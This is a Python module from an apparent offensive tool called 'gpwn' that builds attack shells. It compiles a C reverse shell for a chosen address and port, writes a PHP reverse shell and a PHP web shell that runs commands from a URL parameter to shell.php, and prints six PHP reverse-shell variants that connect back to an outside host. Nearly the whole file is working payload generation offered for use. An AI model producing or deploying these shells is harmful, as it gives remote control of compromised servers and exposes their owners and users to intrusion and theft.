import os, sys
import logging
from subprocess import Popen, PIPE, check_output

from gpwn.resources import get_path
from gpwn.exceptions import ShellError

logger = logging.getLogger().getChild(__name__)
printer = logging.getLogger('printer').getChild(__name__)

class Shell:
    def __init__(self, address: str, port: int):
        self.address = address
        self.port = port

    def generate_reverse_shell(self):
        logger.error("reverse shell not implemented")

    def generate_bind_shell(self):
        logger.error("bind shell not implemented")

    def generate_cmd_shell(self):
        logger.error("cmd shell not implemented")

    def print(self):
        logger.error("no variants available")


class C(Shell):
    def __init__(self, address: str, port: int, shell: str):
        Shell.__init__(self, address=address, port=port)
        self.shell = shell

    def generate_reverse_shell(self):
        self.validate()

        shell = "\"%s\"" % self.shell
        port = self.port
        address = "\"%s\"" % self.address
        path = os.path.join(get_path(), 'rhell.c')
        logger.debug("compiling: %s -DREMOTE_ADDR=%s -DREMOTE_PORT=%s -DSHELL=%s", path, address, port, shell)
        pipe = Popen(
            ["gcc", path, "-o", "rvs_shell", "-DREMOTE_ADDR=%s" % address, "-DREMOTE_PORT=%s" % port,
             "-DSHELL=%s" % shell,
             "-Wno-implicit-function-declaration"])
        logger.info("created reverse shell")

    def validate(self):
        if self.address is None:
            raise ShellError('Missing or invalid address')
        if self.port is None:
            raise ShellError('Missing or invalid port')


class Php(Shell):
    def __init__(self, address: str, port: int, shell: str):
        Shell.__init__(self, address=address, port=port)
        self.shell = shell

    def generate_reverse_shell(self):
        shell = "<?php $sock=fsockopen(\"%s\",%s);exec(\"%s -i <&3 >&3 2>&3\");?>" % (
            self.address, self.port, self.shell)
        with open('shell.php', 'w') as file:
            file.write(shell)

        logger.info("created rvs_shell.php")

    def generate_cmd_shell(self):
        shell = "<?php system($_GET['cmd']);?>"
        with open('shell.php', 'w') as file:
            file.write(shell)
        logger.info("created cmd_shell.php")

    def print(self):
        printer.info("*** PHP REVERSE SHELL VARIANTS ***")
        printer.info('$sock=fsockopen("%s",%s);exec("%s -i <&3 >&3 2>&3");' % (self.address, self.port, self.shell))
        printer.info(
            '$sock=fsockopen("%s",%s);shell_exec("%s -i <&3 >&3 2>&3");' % (self.address, self.port, self.shell))
        printer.info('$sock=fsockopen("%s",%s);`%s -i <&3 >&3 2>&3`;' % (self.address, self.port, self.shell))
        printer.info('$sock=fsockopen("%s",%s);passthru("%s -i <&3 >&3 2>&3");' % (self.address, self.port, self.shell))
        printer.info(
            '$sock=fsockopen("%s",%s);popen("%s -i <&3 >&3 2>&3", "r");' % (self.address, self.port, self.shell))
        printer.info('$sock=fsockopen("%s",%s);$proc=proc_open("%s -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);' % (
            self.address, self.port, self.shell))
